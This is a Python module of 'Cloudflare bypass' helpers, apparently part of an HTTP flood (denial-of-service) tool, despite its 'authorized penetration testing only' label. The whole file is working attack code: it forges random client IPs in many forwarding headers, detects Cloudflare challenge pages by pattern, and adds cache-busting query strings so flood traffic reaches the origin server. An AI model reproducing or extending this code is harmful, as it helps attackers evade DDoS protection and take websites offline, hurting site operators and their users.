#!/usr/bin/env python3
"""
Cloudflare bypass utilities for HTTP flood
FOR AUTHORIZED PENETRATION TESTING ONLY
"""

import random
import re
import time


class CFBypass:
    """Cloudflare bypass techniques"""
    
    @staticmethod
    def generate_random_ip():
        return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
    
    @staticmethod
    def get_bypass_headers(target):
        ip = CFBypass.generate_random_ip()
        return {
            "Host": target,
            "X-Forwarded-For": ip,
            "X-Real-IP": ip,
            "CF-Connecting-IP": ip,
            "X-Originating-IP": ip,
            "X-Remote-IP": ip,
            "X-Remote-Addr": ip,
            "X-Client-IP": ip,
            "Forwarded": f"for={ip};proto=https;by={ip}",
            "True-Client-IP": ip,
            "CDN-Loop": "cloudflare",
            "Cache-Control": "no-cache, no-store, must-revalidate",
            "Pragma": "no-cache",
            "Upgrade-Insecure-Requests": "1",
        }
    
    @staticmethod
    def detect_challenge(response_text):
        patterns = [
            r'cf-browser-verification',
            r'jschl_answer',
            r'__cf_chl_f_tk',
            r'__cf_chl_opt',
            r'challenge-platform',
            r'cf_challenge_response',
            r'Cloudflare Ray ID:',
            r'Attention Required!',
            r'Just a moment...',
        ]
        for pattern in patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        return False
    
    @staticmethod
    def generate_cache_buster():
        return f"?_{int(time.time()*1000)}={random.randint(100000,999999)}"
